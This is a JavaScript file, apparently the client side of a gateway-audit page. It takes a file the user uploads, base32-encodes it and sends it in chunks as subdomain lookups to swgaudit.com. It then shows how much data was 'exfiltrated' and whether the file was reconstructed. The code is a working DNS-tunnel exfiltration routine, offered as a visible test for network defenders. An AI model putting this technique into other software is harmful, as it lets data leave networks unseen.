document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM loaded, initializing event listeners');
    const uploadArea = document.getElementById('upload-area');
    const fileInput = document.getElementById('fileUpload');
    const resetButton = document.getElementById("reset-button");
    const Card = document.querySelector('.container');
    const failureContainer = document.getElementById("failure-container");
    const dataTheftForm = document.getElementById('data-theft-form');

    const handleFiles = files => files.length && handleFileUpload(files[0]);

    uploadArea.addEventListener('click', () => fileInput.click());
    uploadArea.addEventListener('dragover', e => {
        e.preventDefault();
        uploadArea.classList.add('dragover');
    });
    uploadArea.addEventListener('dragleave', () => uploadArea.classList.remove('dragover'));
    uploadArea.addEventListener('drop', e => {
        e.preventDefault();
        uploadArea.classList.remove('dragover');
        fileInput.files = e.dataTransfer.files;
        handleFiles(e.dataTransfer.files);
    });

    fileInput.addEventListener('change', e => handleFiles(e.target.files));

    resetButton.addEventListener("click", () => {
        failureContainer.classList.add("hidden");
        Card.classList.remove("failed");
        dataTheftForm.classList.remove("hidden");

        // Reset file upload
        fileInput.value = '';
        uploadArea.style.pointerEvents = 'auto';
        uploadArea.classList.remove('uploading');
        uploadArea.style.setProperty('--progress', '0%');
        const uploadText = uploadArea.querySelector('.upload-text');
        const constraints = uploadArea.querySelector('.constraints');
        uploadText.textContent = 'Drag and drop or click to upload a file';
        constraints.textContent = 'Maximum file size: 100KB';

        // Reset timer
        if (countdownInterval) {
            clearInterval(countdownInterval);
        }
        const timerElement = document.getElementById('timer');
        timerElement.textContent = 'File will be deleted from the server in 10 minutes';
    });
});

function generateRandomId() {
    const id = Math.random().toString(36).substring(5, 15);
    console.log('Generated new ID:', id);
    return id;
}
let currentId = generateRandomId();
let countdownInterval;

async function fetchResults() {
    console.log('Fetching results for ID:', currentId);
    try {
        const response = await fetch(`fetch_uploaded_data.php?id=${currentId}`);
        console.log('Fetch response:', response);
        const data = await response.json();
        console.log('Parsed response data:', data);
        
        if (!data.success) {
            console.warn('Request failed:', data.message);
            document.getElementById('resultMessage').textContent = data.message;
            return;
        }

        currentId = generateRandomId();
        console.log('Generated new ID after successful fetch:', currentId);

        if (data.fileUrl) {
            console.log('File URL received:', data.fileUrl);
            const link = document.createElement('a');
            link.href = data.fileUrl;
            link.textContent = 'Download reconstructed file';
            document.getElementById('resultMessage').innerHTML = '';
            document.getElementById('resultMessage').appendChild(link);
        }
            
    } catch (error) {
        console.error('Error in fetchResults:', error);
        document.getElementById('resultMessage').textContent = 'Error loading results: ' + error.message;
    }
}

async function handleFileUpload(file) {
    console.log('Starting file upload process:', { fileName: file.name, fileSize: file.size, fileType: file.type });
    if (!file) {
        console.warn('No file selected');
        return;
    }

    if (file.size > 100 * 1024) {
        console.warn('File size exceeds limit:', file.size);
        alert("File size must be less than 100KB.");
        return;
    }

    const uploadArea = document.getElementById('upload-area');
    const uploadText = uploadArea.querySelector('.upload-text');
    const constraints = uploadArea.querySelector('.constraints');
    
    // Disable further uploads
    uploadArea.style.pointerEvents = 'none';
    uploadArea.classList.add('uploading');
    uploadText.textContent = `Uploading ${file.name}`;
    constraints.textContent = 'Data Exfiltrated: 0 bytes';
    
    const reader = new FileReader();
    reader.onload = async function(evt) {
        console.log('File read complete, converting to byte array');
        const arrayBuffer = evt.target.result;
        const byteArray = new Uint8Array(arrayBuffer);
        const base32String = base32Encode(byteArray);

        const metadata = {
            name: file.name,
            type: file.type,
            size: file.size
        };
        const metadataStr = base32Encode(new TextEncoder().encode(JSON.stringify(metadata)));
        
        const chunks = [];
        const maxDomainLength = 253;
        const staticSuffix = '.swgaudit.com';
        const maxDataLength = maxDomainLength - currentId.length - staticSuffix.length - 5;
        const subdomainLimit = 60;

        chunks.push({
            data: [metadataStr.replace(/(.{60})/g, "$1.")],
            number: 0,
            isMeta: true
        });

        let chunkNo = 1;
        for (let i = 0; i < base32String.length;) {
            const dataChunks = [];
            let remainingLength = maxDataLength;

            while (i < base32String.length && remainingLength > 0) {
                const chunkSize = Math.min(subdomainLimit, remainingLength, base32String.length - i);
                dataChunks.push(base32String.substring(i, i + chunkSize));
                remainingLength -= (chunkSize + 1);
                i += chunkSize;
            }

            chunks.push({
                data: dataChunks,
                number: chunkNo++
            });
        }

        console.log('Metadata prepared:', { metadata, chunks: chunks.length });
        
        let completedChunks = 0;
        const totalChunks = chunks.length;
        let totalBytesExfiltrated = 0;

        try {
            console.log('Starting chunk upload process:', { totalChunks });
            await Promise.all(chunks.map(async (chunk, index) => {
                const url = `https://${currentId}.${chunk.number}.${chunk.data.join('.')}${staticSuffix}`;
                console.log(`Sending request for chunk ${chunk.number}: ${url}`);
                
                try {
                    console.log(`Uploading chunk ${chunk.number}/${totalChunks}`);
                    await fetch(url, { mode: 'no-cors' });
                    console.log(`Chunk ${chunk.number} upload complete`);
                } catch (error) {
                    console.error(`Request failed for chunk ${chunk.number}:`, error);
                } finally {
                    completedChunks++;
                    const progress = (completedChunks / totalChunks) * 100;
                    uploadArea.style.setProperty('--progress', `${progress}%`);
                    
                    totalBytesExfiltrated += chunk.data.join('.').length;
                    constraints.textContent = `Data Exfiltrated: ${formatBytes(totalBytesExfiltrated)}`;
                    console.log(`Progress update: ${progress}%, bytes exfiltrated: ${totalBytesExfiltrated}`);
                }
            }));

            console.log('All chunks uploaded, fetching final data');
            const response = await fetch(`fetch_uploaded_data.php?id=${currentId}`);
            const data = await response.json();
            
            if (data.success && data.fileUrl) {
                console.log('File upload successful, updating UI with URL:', data.fileUrl);
                const Card = document.querySelector('.container');
                const failureContainer = document.getElementById("failure-container");
                const malwareForm = document.getElementById('data-theft-form');
                const copyBtn = document.getElementById('copy-button');
                const downloadButton = document.getElementById("download-button");

                failureContainer.classList.remove("hidden");
                Card.classList.add("failed");
                malwareForm.classList.add("hidden");

                // Update download button with file URL
                downloadButton.onclick = (e) => {
                    window.open(data.fileUrl, '_blank');
                }
                
                // Update copy button handler
                copyBtn.onclick = (e) => {
                    e.stopPropagation();
                    copyToClipboard(data.fileUrl);
                    copyBtn.classList.add('copied');
                    setTimeout(() => copyBtn.classList.remove('copied'), 2000);
                };

                let timeLeft = 600; // 10 minutes in seconds
                const timerElement = document.getElementById('timer');
                if (countdownInterval) {
                    clearInterval(countdownInterval);
                }
                countdownInterval = setInterval(() => {
                    // console.log('Timer update:', timeLeft);
                    const minutes = Math.floor(timeLeft / 60);
                    const seconds = timeLeft % 60;
                    timerElement.textContent = `File will be deleted from the server in ${minutes}:${seconds.toString().padStart(2, '0')}`;
                    
                    if (timeLeft === 0) {
                        clearInterval(countdownInterval);
                        window.location.reload();
                    }
                    timeLeft--;
                }, 1000);
            }
            
            currentId = generateRandomId();
            console.log('Process complete, new ID generated:', currentId);
        } catch (error) {
            console.error('Upload process failed:', error);
            uploadArea.style.pointerEvents = 'auto';
            uploadArea.classList.remove('uploading');
            uploadText.textContent = 'Drag and drop or click to upload a file';
            constraints.textContent = 'Maximum file size: 100KB';
        }
    };
    reader.readAsArrayBuffer(file);
}

function copyToClipboard(text) {
    console.log('Copying to clipboard:', text);
    navigator.clipboard.writeText(text).then(() => {
        console.log('Successfully copied to clipboard');
        const btn = document.getElementById('copy-button');
        const originalText = btn.textContent;
        btn.textContent = 'Copied!';
        setTimeout(() => {
            console.log('Resetting button text');
            btn.textContent = originalText;
        }, 2000);
    }).catch(err => {
        console.error('Failed to copy:', err);
    });
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}